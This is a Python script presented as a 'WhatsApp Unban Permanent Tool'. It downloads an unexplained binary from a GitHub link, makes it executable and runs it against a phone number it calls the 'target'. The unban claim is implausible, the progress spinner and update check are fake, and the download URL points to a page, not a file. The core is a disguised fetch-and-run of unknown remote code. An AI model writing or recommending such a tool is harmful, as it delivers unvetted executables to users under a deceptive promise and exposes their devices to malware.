import os
import sys
import subprocess
import time
import requests
import platform

def clear_screen():
    """Clear the terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """Display the tool banner"""
    banner = """
╔══════════════════════════════════════════════════════════════╗
║                   WhatsApp Unban Permanent Tool              ║
║                   𖣘 DAXLORD ™ 𖣘 v1.0                        ║
╚══════════════════════════════════════════════════════════════╝
    """
    print(banner)

def download_bin_file():
    """Download the .bin file from GitHub if not exists"""
    bin_url = "https://github.com/LORD-DAX1010101/Unban/blob/main/unban.bin"
    local_bin_path = "Whatsapp-unban.bin"
    
    if os.path.exists(local_bin_path):
        print("✅ Unban found locally")
        return local_bin_path
    
    print("📥 Downloading unban from Dax core...")
    try:
        response = requests.get(bin_url, stream=True)
        response.raise_for_status()
        
        with open(local_bin_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        # Make executable on Unix systems
        if platform.system() != "Windows":
            os.chmod(local_bin_path, 0o755)
        
        print("✅ Unban downloaded successfully!")
        return local_bin_path
        
    except Exception as e:
        print(f"❌ Failed to download Unban core: {e}")
        return None

def execute_bin_file(bin_path, phone_number):
    """Execute the unban binary with phone number"""
    if not os.path.exists(bin_path):
        print("❌ Unban file not found!")
        return False
    
    try:
        print(f"🚀 Executing unban process for: {phone_number}")
        print("⏳ Please wait...")
        
        # Execute the binary
        process = subprocess.Popen(
            [bin_path, phone_number],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Show progress animation
        animation = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        for i in range(20):
            print(f"\r{animation[i % len(animation)]} Processing unban request...", end="")
            time.sleep(0.1)
        
        stdout, stderr = process.communicate()
        
        print("\r✅ Process completed!                    ")
        
        if process.returncode == 0:
            print("✅ Unban request submitted successfully!")
            if stdout.strip():
                print(f"📄 Output: {stdout.strip()}")
            return True
        else:
            print("❌ Unban process failed!")
            if stderr.strip():
                print(f"💬 Error: {stderr.strip()}")
            return False
            
    except Exception as e:
        print(f"❌ Execution error: {e}")
        return False

def unban_permanent():
    """Main unban function"""
    clear_screen()
    print_banner()
    
    print("🛠️  Permanent Unban Service")
    print("=" * 50)
    
    # Download or find binary
    bin_path = download_bin_file()
    if not bin_path:
        input("\nPress Enter to return to main menu...")
        return
    
    # Get phone number
    print("\n📝 Enter target information:")
    try:
        phone_number = input("WhatsApp number (with country code): ").strip()
        if not phone_number:
            print("❌ Phone number is required!")
            return
        
        # Validate phone number format (basic check)
        if not phone_number.replace('+', '').replace(' ', '').isdigit():
            print("❌ Invalid phone number format!")
            return
        
        # Confirm action
        print(f"\n📞 Target: {phone_number}")
        print(f"🔧 Unban: {os.path.basename(bin_path)}")
        
        confirm = input("\n⚠️  Confirm unban operation? (y/N): ").lower().strip()
        if confirm not in ['y', 'yes']:
            print("❌ Operation cancelled!")
            return
        
        # Execute unban
        print("\n" + "=" * 50)
        success = execute_bin_file(bin_path, phone_number)
        print("=" * 50)
        
        if success:
            print(f"\n✅ Permanent unban initiated for: {phone_number}")
            print("⏰ Please wait 24-48 hours for changes to take effect")
        else:
            print(f"\n❌ Failed to process unban for: {phone_number}")
            
    except KeyboardInterrupt:
        print("\n\n❌ Operation cancelled!")
    except Exception as e:
        print(f"\n❌ Error: {e}")
    
    input("\nPress Enter to continue...")

def check_updates():
    """Check for updates on GitHub"""
    print("🔍 Checking for updates...")
    # Add update checking logic here
    print("✅ You have the latest version!")

def main():
    """Main menu"""
    while True:
        clear_screen()
        print_banner()
        
        print("📱 Main Menu")
        print("=" * 50)
        print("[1] Unban Permanent")
        print("[2] Check for Updates")
        print("[0] Exit")
        print("=" * 50)
        
        try:
            choice = input("\nSelect an option: ").strip()
            
            if choice == '1':
                unban_permanent()
            elif choice == '2':
                check_updates()
                input("\nPress Enter to continue...")
            elif choice == '0':
                print("\n👋 Thank you for using WhatsApp Unban Tool!")
                break
            else:
                print("❌ Invalid option!")
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n\n👋 Goodbye!")
            break

if __name__ == "__main__":
    main()
